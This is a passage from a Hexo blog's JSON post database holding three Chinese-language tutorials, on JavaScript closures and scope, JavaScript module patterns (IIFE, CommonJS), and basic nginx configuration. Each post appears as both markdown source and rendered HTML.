innerfun()\n\t\t\t{\n\t\t\t\tvar inner = 2;\n\t\t\t}\n\t\t}\n\n\t\tfunction infun2()\n\t   ｛\n\t   \t\t\t   \n\t\t｝\n    }\n\n    function myfun2()\n    {\n\n    }\n```\n这是一个三层嵌套的函数。我对局部的了解是指函数的内部，局部对像就是指函数内部的变量及函数。全局对象就是没有定义在任何函数内的变量和函数。全局对象是window的子对象。\n\n在上面的这个程序中，全局对象有:\n*global变量\n*myfun函数\n*myfun2函数\n\nmyfun的内部对像有:\n*my变量\n*infun函数\n*infun2函数\n\ninfun的内部对像有:\n*in变量\n*innerfun函数\n以此类推。\n\n了解了局部与全局后，闭包就容易了解,它是指内层函数可以使用外层函数局部对象，外层函数不能使用内层函数的局部对象，这种规则就叫函数的闭包。\n从上面这个例子，我们就清楚在innerfun函数中，可以访问当前所有对像，因为它是最内层函数。而在infun函数中除了innerfun函数和它的内部变量inner不能访问外，其它的也都可以访问。\n大家都可以访问全局对象，因为它在最外层。这就是为什么很多js库总是建一个对象放到window下做全局对象，你只要引用就可以访问到它。\n\n补充:没有使用var进行定义的变量也是全局对象。例如:\n\n``` Javascript\n    function myfun()\n    {\n        var part =\"part variable\";\n        global  =\"global variable\";\n    }\n```\n\n\n\n\n\n","source":"_posts/javascript-base-1.md","raw":"---\ntitle: Javascript的闭包 \ndate: 2016-1-3\ndesc: Javascript  闭包\n---\n闭包是Javascript的一个重点的概念，在开发过程中用得非常多，但是在了解闭包之前我们需要了解全局与局部的概念，下面来看这个例子。\n<!-- more -->\n``` Javascript\n\tvar global = 1;\n    function myfun()\n    {\n    \tvar my = 1;\n\t\tfunction infun()\n\t\t{\n\t\t\tvar in = 2;\n\t\t\tfunction innerfun()\n\t\t\t{\n\t\t\t\tvar inner = 2;\n\t\t\t}\n\t\t}\n\n\t\tfunction infun2()\n\t   ｛\n\t   \t\t\t   \n\t\t｝\n    }\n\n    function myfun2()\n    {\n\n    }\n```\n这是一个三层嵌套的函数。我对局部的了解是指函数的内部，局部对像就是指函数内部的变量及函数。全局对象就是没有定义在任何函数内的变量和函数。全局对象是window的子对象。\n\n在上面的这个程序中，全局对象有:\n*global变量\n*myfun函数\n*myfun2函数\n\nmyfun的内部对像有:\n*my变量\n*infun函数\n*infun2函数\n\ninfun的内部对像有:\n*in变量\n*innerfun函数\n以此类推。\n\n了解了局部与全局后，闭包就容易了解,它是指内层函数可以使用外层函数局部对象，外层函数不能使用内层函数的局部对象，这种规则就叫函数的闭包。\n从上面这个例子，我们就清楚在innerfun函数中，可以访问当前所有对像，因为它是最内层函数。而在infun函数中除了innerfun函数和它的内部变量inner不能访问外，其它的也都可以访问。\n大家都可以访问全局对象，因为它在最外层。这就是为什么很多js库总是建一个对象放到window下做全局对象，你只要引用就可以访问到它。\n\n补充:没有使用var进行定义的变量也是全局对象。例如:\n\n``` Javascript\n    function myfun()\n    {\n        var part =\"part variable\";\n        global  =\"global variable\";\n    }\n```\n\n\n\n\n\n","slug":"javascript-base-1","published":1,"updated":"2016-06-16T03:57:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0lltd000mg2x6pxr6mf57","content":"<p>闭包是Javascript的一个重点的概念，在开发过程中用得非常多，但是在了解闭包之前我们需要了解全局与局部的概念，下面来看这个例子。<br><a id=\"more\"></a><br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> global = <span class=\"number\">1</span>;</span><br><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">myfun</span>(<span class=\"params\"></span>)</span><br><span class=\"line\">   </span>&#123;</span><br><span class=\"line\">   \t<span class=\"keyword\">var</span> my = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">infun</span>(<span class=\"params\"></span>)</span><br><span class=\"line\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">var</span> <span class=\"keyword\">in</span> = <span class=\"number\">2</span>;</span><br><span class=\"line\">\t\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">innerfun</span>(<span class=\"params\"></span>)</span><br><span class=\"line\">\t\t</span>&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">var</span> inner = <span class=\"number\">2</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">infun2</span>(<span class=\"params\"></span>)</span><br><span class=\"line\">   ｛</span><br><span class=\"line\">   \t\t\t   </span><br><span class=\"line\">\t｝</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"title\">function</span> <span class=\"title\">myfun2</span>(<span class=\"params\"></span>)</span><br><span class=\"line\">   </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure></p>\n<p>这是一个三层嵌套的函数。我对局部的了解是指函数的内部，局部对像就是指函数内部的变量及函数。全局对象就是没有定义在任何函数内的变量和函数。全局对象是window的子对象。</p>\n<p>在上面的这个程序中，全局对象有:<br><em>global变量\n</em>myfun函数<br>*myfun2函数</p>\n<p>myfun的内部对像有:<br><em>my变量\n</em>infun函数<br>*infun2函数</p>\n<p>infun的内部对像有:<br><em>in变量\n</em>innerfun函数<br>以此类推。</p>\n<p>了解了局部与全局后，闭包就容易了解,它是指内层函数可以使用外层函数局部对象，外层函数不能使用内层函数的局部对象，这种规则就叫函数的闭包。<br>从上面这个例子，我们就清楚在innerfun函数中，可以访问当前所有对像，因为它是最内层函数。而在infun函数中除了innerfun函数和它的内部变量inner不能访问外，其它的也都可以访问。<br>大家都可以访问全局对象，因为它在最外层。这就是为什么很多js库总是建一个对象放到window下做全局对象，你只要引用就可以访问到它。</p>\n<p>补充:没有使用var进行定义的变量也是全局对象。例如:</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">myfun</span>(<span class=\"params\"></span>)</span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> part =<span class=\"string\">\"part variable\"</span>;</span><br><span class=\"line\">    global  =<span class=\"string\">\"global variable\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","excerpt":"<p>闭包是Javascript的一个重点的概念，在开发过程中用得非常多，但是在了解闭包之前我们需要了解全局与局部的概念，下面来看这个例子。<br>","more":"<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> global = <span class=\"number\">1</span>;</span><br><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">myfun</span>(<span class=\"params\"></span>)</span><br><span class=\"line\">   </span>&#123;</span><br><span class=\"line\">   \t<span class=\"keyword\">var</span> my = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">infun</span>(<span class=\"params\"></span>)</span><br><span class=\"line\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">var</span> <span class=\"keyword\">in</span> = <span class=\"number\">2</span>;</span><br><span class=\"line\">\t\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">innerfun</span>(<span class=\"params\"></span>)</span><br><span class=\"line\">\t\t</span>&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">var</span> inner = <span class=\"number\">2</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">infun2</span>(<span class=\"params\"></span>)</span><br><span class=\"line\">   ｛</span><br><span class=\"line\">   \t\t\t   </span><br><span class=\"line\">\t｝</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"title\">function</span> <span class=\"title\">myfun2</span>(<span class=\"params\"></span>)</span><br><span class=\"line\">   </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure></p>\n<p>这是一个三层嵌套的函数。我对局部的了解是指函数的内部，局部对像就是指函数内部的变量及函数。全局对象就是没有定义在任何函数内的变量和函数。全局对象是window的子对象。</p>\n<p>在上面的这个程序中，全局对象有:<br><em>global变量\n</em>myfun函数<br>*myfun2函数</p>\n<p>myfun的内部对像有:<br><em>my变量\n</em>infun函数<br>*infun2函数</p>\n<p>infun的内部对像有:<br><em>in变量\n</em>innerfun函数<br>以此类推。</p>\n<p>了解了局部与全局后，闭包就容易了解,它是指内层函数可以使用外层函数局部对象，外层函数不能使用内层函数的局部对象，这种规则就叫函数的闭包。<br>从上面这个例子，我们就清楚在innerfun函数中，可以访问当前所有对像，因为它是最内层函数。而在infun函数中除了innerfun函数和它的内部变量inner不能访问外，其它的也都可以访问。<br>大家都可以访问全局对象，因为它在最外层。这就是为什么很多js库总是建一个对象放到window下做全局对象，你只要引用就可以访问到它。</p>\n<p>补充:没有使用var进行定义的变量也是全局对象。例如:</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">myfun</span>(<span class=\"params\"></span>)</span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> part =<span class=\"string\">\"part variable\"</span>;</span><br><span class=\"line\">    global  =<span class=\"string\">\"global variable\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"Javascript模块化开发","date":"2016-03-20T16:00:00.000Z","desc":"Javascript  模块化","_content":"Javascript不算模块化编程语言，但是web开发需要团队开发和团队协做。现在javascript模块化开发已非常正熟，支持模块化开发的框架非常多。\n\n## 原始写法\n``` Javascript\n    function func1(){\n        ...\n    }\n\n    function func2(){\n        ...\n    };\n```\n只要把不同的函数简单地放在一个文件中，就算是一个模块，通常一个文件一个模块。\n<!-- more -->\n\n## jquery时代\n``` Javascript\n　　var module1 = (function ($, windows) {\n　　　　//...\n　　})(jQuery, windows);\n```\n通过立即执行匿名函数来达到封装的作用,如模块内部调用全局变量，则将其输入模块中。\n\n## commonjs时代\ncommonjs规范是目前JavaScript模块化的事实标准。支持commonjs规范的框架及程序比较多，如node,seajs.规范中最重要的二点:\n* require它是一个函数,引用其它模块使用require。\n* exports是一个对象，导出模块api使用exports，可供其它模块调用。\n当然除了这两点还有一些其它细节不一一介绍。下面看一个示例:\n\nmath.js\n``` Javascript\n    exports.add=function(x,y){\n        return x+y;\n    };\n```\nincrement.js\n``` Javascript\n    var add = require('math').add;\n    exports.increment = function (val){\n        return add(val,1);\n    }\n```\n\nprogram.js\n``` Javascript\n    var inc = require('increment').increment;\n    var a = 1;\n    inc(a); \n```\n\n","source":"_posts/javascript-base-4.md","raw":"---\ntitle: Javascript模块化开发\ndate: 2016-3-21\ndesc: Javascript  模块化 \n---\nJavascript不算模块化编程语言，但是web开发需要团队开发和团队协做。现在javascript模块化开发已非常正熟，支持模块化开发的框架非常多。\n\n## 原始写法\n``` Javascript\n    function func1(){\n        ...\n    }\n\n    function func2(){\n        ...\n    };\n```\n只要把不同的函数简单地放在一个文件中，就算是一个模块，通常一个文件一个模块。\n<!-- more -->\n\n## jquery时代\n``` Javascript\n　　var module1 = (function ($, windows) {\n　　　　//...\n　　})(jQuery, windows);\n```\n通过立即执行匿名函数来达到封装的作用,如模块内部调用全局变量，则将其输入模块中。\n\n## commonjs时代\ncommonjs规范是目前JavaScript模块化的事实标准。支持commonjs规范的框架及程序比较多，如node,seajs.规范中最重要的二点:\n* require它是一个函数,引用其它模块使用require。\n* exports是一个对象，导出模块api使用exports，可供其它模块调用。\n当然除了这两点还有一些其它细节不一一介绍。下面看一个示例:\n\nmath.js\n``` Javascript\n    exports.add=function(x,y){\n        return x+y;\n    };\n```\nincrement.js\n``` Javascript\n    var add = require('math').add;\n    exports.increment = function (val){\n        return add(val,1);\n    }\n```\n\nprogram.js\n``` Javascript\n    var inc = require('increment').increment;\n    var a = 1;\n    inc(a); \n```\n\n","slug":"javascript-base-4","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0lltl000ng2x62138zzxx","content":"<p>Javascript不算模块化编程语言，但是web开发需要团队开发和团队协做。现在javascript模块化开发已非常正熟，支持模块化开发的框架非常多。</p>\n<h2 id=\"原始写法\"><a href=\"#原始写法\" class=\"headerlink\" title=\"原始写法\"></a>原始写法</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func1</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func2</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>只要把不同的函数简单地放在一个文件中，就算是一个模块，通常一个文件一个模块。<br><a id=\"more\"></a></p>\n<h2 id=\"jquery时代\"><a href=\"#jquery时代\" class=\"headerlink\" title=\"jquery时代\"></a>jquery时代</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">　　<span class=\"keyword\">var</span> module1 = (<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">$, windows</span>) </span>&#123;</span><br><span class=\"line\">　　　　<span class=\"comment\">//...</span></span><br><span class=\"line\">　　&#125;)(jQuery, windows);</span><br></pre></td></tr></table></figure>\n<p>通过立即执行匿名函数来达到封装的作用,如模块内部调用全局变量，则将其输入模块中。</p>\n<h2 id=\"commonjs时代\"><a href=\"#commonjs时代\" class=\"headerlink\" title=\"commonjs时代\"></a>commonjs时代</h2><p>commonjs规范是目前JavaScript模块化的事实标准。支持commonjs规范的框架及程序比较多，如node,seajs.规范中最重要的二点:</p>\n<ul>\n<li>require它是一个函数,引用其它模块使用require。</li>\n<li>exports是一个对象，导出模块api使用exports，可供其它模块调用。<br>当然除了这两点还有一些其它细节不一一介绍。下面看一个示例:</li>\n</ul>\n<p>math.js<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exports.add=<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">x,y</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x+y;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>increment.js<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> add = <span class=\"built_in\">require</span>(<span class=\"string\">'math'</span>).add;</span><br><span class=\"line\">exports.increment = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">val</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> add(val,<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>program.js<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> inc = <span class=\"built_in\">require</span>(<span class=\"string\">'increment'</span>).increment;</span><br><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">1</span>;</span><br><span class=\"line\">inc(a);</span><br></pre></td></tr></table></figure></p>\n","excerpt":"<p>Javascript不算模块化编程语言，但是web开发需要团队开发和团队协做。现在javascript模块化开发已非常正熟，支持模块化开发的框架非常多。</p>\n<h2 id=\"原始写法\"><a href=\"#原始写法\" class=\"headerlink\" title=\"原始写法\"></a>原始写法</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func1</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func2</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>只要把不同的函数简单地放在一个文件中，就算是一个模块，通常一个文件一个模块。<br>","more":"</p>\n<h2 id=\"jquery时代\"><a href=\"#jquery时代\" class=\"headerlink\" title=\"jquery时代\"></a>jquery时代</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">　　<span class=\"keyword\">var</span> module1 = (<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">$, windows</span>) </span>&#123;</span><br><span class=\"line\">　　　　<span class=\"comment\">//...</span></span><br><span class=\"line\">　　&#125;)(jQuery, windows);</span><br></pre></td></tr></table></figure>\n<p>通过立即执行匿名函数来达到封装的作用,如模块内部调用全局变量，则将其输入模块中。</p>\n<h2 id=\"commonjs时代\"><a href=\"#commonjs时代\" class=\"headerlink\" title=\"commonjs时代\"></a>commonjs时代</h2><p>commonjs规范是目前JavaScript模块化的事实标准。支持commonjs规范的框架及程序比较多，如node,seajs.规范中最重要的二点:</p>\n<ul>\n<li>require它是一个函数,引用其它模块使用require。</li>\n<li>exports是一个对象，导出模块api使用exports，可供其它模块调用。<br>当然除了这两点还有一些其它细节不一一介绍。下面看一个示例:</li>\n</ul>\n<p>math.js<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exports.add=<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">x,y</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x+y;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>increment.js<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> add = <span class=\"built_in\">require</span>(<span class=\"string\">'math'</span>).add;</span><br><span class=\"line\">exports.increment = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">val</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> add(val,<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>program.js<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> inc = <span class=\"built_in\">require</span>(<span class=\"string\">'increment'</span>).increment;</span><br><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">1</span>;</span><br><span class=\"line\">inc(a);</span><br></pre></td></tr></table></figure></p>"},{"title":"nginx 速记1","date":"2016-09-09T16:00:00.000Z","desc":"nginx","_content":"\n示例:\n``` conf\nhttp {\n\t\n\tlog_format upstream_time '$remote_addr - $remote_user [$time_local] '\n                             '\"$request\" $status $body_bytes_sent '\n                             '\"$http_referer\" \"$http_user_agent\"'\n                             'rt=$request_time uct=\"$upstream_connect_time\" uht=\"$upstream_header_time\" urt=\"$upstream_response_time\"';\n    server {\n\n    \taccess_log /spool/logs/nginx-access.log upstream_time;\n    \terror_log logs/error.log warn;\n\t\tlisten 80 backlog 4096;\n\t\tserver_name example.org www.example.org;\n\n\t\tlocation /images/ {\n        \troot /data;\n        \tindex index.html;\n        \tsendfile   on;\n    \t\ttcp_nopush on;\n    \t}\n\n    \tlocation ~ \\.php {\n    \t\tproxy_set_header Host $host;\n    \t\tproxy_set_header X-Real-IP $remote_addr;\n    \t\tproxy_set_header Accept-Encoding \"\";\n    \t\tproxy_buffers 16 4k;\n    \t\tproxy_buffer_size 2k;\n\t\t    proxy_pass http://localhost:8000;\n\t\t}\n    }\n}\n\n```\n\n## web服务器\n\n\nhttp 服务\nserver 虚拟机\nlocation 路径\nlisten 监听端口 backlog 堆大小\n\n## 静态资源\n\nlocation 路径(正则表达式):\nroot 目录\nindex  默认页面\n\n上传文件设置:\nsendfile           on;\nsendfile_max_chunk 1m;\n\n## 代理\n\n针对路径\nproxy_pass 转发地址\nproxy_set_header 设置头信息 \nＨost 域名\nX-Real-IP 客户端地址\nproxy_buffers off/on\nproxy_buffers 缓存\nproxy_buffer_size 缓存大小\n\n## 日志\n\n针对主机\nerror_log\naccess_log\n\n查看监听:\nnetstat -Lan","source":"_posts/nginx-1.md","raw":"---\ntitle: nginx 速记1\ndate: 2016-9-10\ndesc: nginx\n---\n\n示例:\n``` conf\nhttp {\n\t\n\tlog_format upstream_time '$remote_addr - $remote_user [$time_local] '\n                             '\"$request\" $status $body_bytes_sent '\n                             '\"$http_referer\" \"$http_user_agent\"'\n                             'rt=$request_time uct=\"$upstream_connect_time\" uht=\"$upstream_header_time\" urt=\"$upstream_response_time\"';\n    server {\n\n    \taccess_log /spool/logs/nginx-access.log upstream_time;\n    \terror_log logs/error.log warn;\n\t\tlisten 80 backlog 4096;\n\t\tserver_name example.org www.example.org;\n\n\t\tlocation /images/ {\n        \troot /data;\n        \tindex index.html;\n        \tsendfile   on;\n    \t\ttcp_nopush on;\n    \t}\n\n    \tlocation ~ \\.php {\n    \t\tproxy_set_header Host $host;\n    \t\tproxy_set_header X-Real-IP $remote_addr;\n    \t\tproxy_set_header Accept-Encoding \"\";\n    \t\tproxy_buffers 16 4k;\n    \t\tproxy_buffer_size 2k;\n\t\t    proxy_pass http://localhost:8000;\n\t\t}\n    }\n}\n\n```\n\n## web服务器\n\n\nhttp 服务\nserver 虚拟机\nlocation 路径\nlisten 监听端口 backlog 堆大小\n\n## 静态资源\n\nlocation 路径(正则表达式):\nroot 目录\nindex  默认页面\n\n上传文件设置:\nsendfile           on;\nsendfile_max_chunk 1m;\n\n## 代理\n\n针对路径\nproxy_pass 转发地址\nproxy_set_header 设置头信息 \nＨost 域名\nX-Real-IP 客户端地址\nproxy_buffers off/on\nproxy_buffers 缓存\nproxy_buffer_size 缓存大小\n\n## 日志\n\n针对主机\nerror_log\naccess_log\n\n查看监听:\nnetstat -Lan","slug":"nginx-1","published":1,"updated":"2016-09-09T12:02:30.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0lltl000og2x66ug1rqas","content":"<p>示例:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http &#123;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tlog_format upstream_time &apos;$remote_addr - $remote_user [$time_local] &apos;</span><br><span class=\"line\">                             &apos;&quot;$request&quot; $status $body_bytes_sent &apos;</span><br><span class=\"line\">                             &apos;&quot;$http_referer&quot; &quot;$http_user_agent&quot;&apos;</span><br><span class=\"line\">                             &apos;rt=$request_time uct=&quot;$upstream_connect_time&quot; uht=&quot;$upstream_header_time&quot; urt=&quot;$upstream_response_time&quot;&apos;;</span><br><span class=\"line\">    server &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    \taccess_log /spool/logs/nginx-access.log upstream_time;</span><br><span class=\"line\">    \terror_log logs/error.log warn;</span><br><span class=\"line\">\t\tlisten 80 backlog 4096;</span><br><span class=\"line\">\t\tserver_name example.org www.example.org;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tlocation /images/ &#123;</span><br><span class=\"line\">        \troot /data;</span><br><span class=\"line\">        \tindex index.html;</span><br><span class=\"line\">        \tsendfile   on;</span><br><span class=\"line\">    \t\ttcp_nopush on;</span><br><span class=\"line\">    \t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    \tlocation ~ \\.php &#123;</span><br><span class=\"line\">    \t\tproxy_set_header Host $host;</span><br><span class=\"line\">    \t\tproxy_set_header X-Real-IP $remote_addr;</span><br><span class=\"line\">    \t\tproxy_set_header Accept-Encoding &quot;&quot;;</span><br><span class=\"line\">    \t\tproxy_buffers 16 4k;</span><br><span class=\"line\">    \t\tproxy_buffer_size 2k;</span><br><span class=\"line\">\t\t    proxy_pass http://localhost:8000;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"web服务器\"><a href=\"#web服务器\" class=\"headerlink\" title=\"web服务器\"></a>web服务器</h2><p>http 服务<br>server 虚拟机<br>location 路径<br>listen 监听端口 backlog 堆大小</p>\n<h2 id=\"静态资源\"><a href=\"#静态资源\" class=\"headerlink\" title=\"静态资源\"></a>静态资源</h2><p>location 路径(正则表达式):<br>root 目录<br>index  默认页面</p>\n<p>上传文件设置:<br>sendfile           on;<br>sendfile_max_chunk 1m;</p>\n<h2 id=\"代理\"><a href=\"#代理\" class=\"headerlink\" title=\"代理\"></a>代理</h2><p>针对路径<br>proxy_pass 转发地址<br>proxy_set_header 设置头信息<br>Ｈost 域名<br>X-Real-IP 客户端地址<br>proxy_buffers off/on<br>proxy_buffers 缓存<br>proxy_buffer_size 缓存大小</p>\n<h2 id=\"日志\"><a href=\"#日志\" class=\"headerlink\" title=\"日志\"></a>日志</h2><p>针对主机<br>error_log<br>access_log</p>\n<p>查看监听:<br>netstat -Lan</p>\n","excerpt":"","more":"<p>示例:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span 